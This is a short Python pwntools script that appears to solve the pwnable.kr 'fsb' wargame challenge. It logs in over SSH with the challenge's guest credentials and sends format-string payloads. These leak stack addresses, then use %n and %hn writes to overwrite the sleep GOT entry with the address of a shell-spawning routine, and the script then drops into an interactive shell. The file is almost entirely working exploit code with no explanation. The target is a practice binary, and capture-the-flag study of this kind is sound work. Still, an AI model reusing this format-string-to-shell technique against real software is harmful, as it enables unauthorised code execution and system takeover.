#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *

#context.arch = 'amd64'
DEBUG = False
if DEBUG:
	io = process("./fsb")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./fsb")
else:
	io = ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')
	elf = ELF("./fsb")
	
def send_string(s):
	io.recvuntil("Give me some format strings")
	io.recvuntil("\n")
	io.send(s)
	#io.recvuntil("Give")
	#return io.recvuntil("Give").strip("Give")
		
#context.log_level = "debug"
#io = process("./doubletrouble")
payload1 = "%14$08x%18$08x"
#Print io.recv(16)
sub_value = 8
#off2 = -(string_addr - ebp_main)/4 + 1
send_string(payload1)
info = io.recv(16)
esp = int((info[:8]),16) - 0x50
main_ebp = int(info[8:],16)
fsp_ebp = esp + 0x0
log.success("main_ebp:"+hex(main_ebp))
log.success("fsp_ebp:"+hex(fsp_ebp))
offset = (main_ebp - esp)/4
sleep_got = elf.got["sleep"]
payload2 = "%%%dc"%(sleep_got) + "%18$n"
send_string(payload2)
sys_sh = 0x080486AB
payload3 = "%%%dc"%(sys_sh&0xffff) + "%%%d$hn"%offset
send_string(payload3)
send_string("A"*30)
io.interactive()
	
